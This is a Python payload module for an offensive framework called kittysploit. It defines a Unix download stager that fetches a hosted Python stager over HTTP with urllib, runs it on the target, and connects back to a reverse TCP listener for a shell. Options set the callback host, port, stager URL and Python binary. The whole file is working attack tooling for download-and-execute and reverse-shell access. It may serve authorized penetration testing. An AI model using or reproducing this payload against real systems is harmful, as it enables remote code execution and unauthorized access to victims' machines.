#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_python_urllib_pipe_python, build_stager_url


class Module(Payload):
    __info__ = {
        "name": "Unix Download Stager, python urllib",
        "description": (
            "Download and exec stager via Python urllib — no curl/wget required. "
            "Host stager.py with host_stager generate."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(4444, "Callback port", True)
    stager_url = OptString("", "Full URL of hosted Python stager", False)
    stager_port = OptInteger(8000, "HTTP port when stager_url empty", False, advanced=True)
    python_binary = OptString("python3", "Python on target", False)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.py")
            print_info(f"stager_url not set — using {url}")
        return build_python_urllib_pipe_python(url, str(self.python_binary or "python3"))
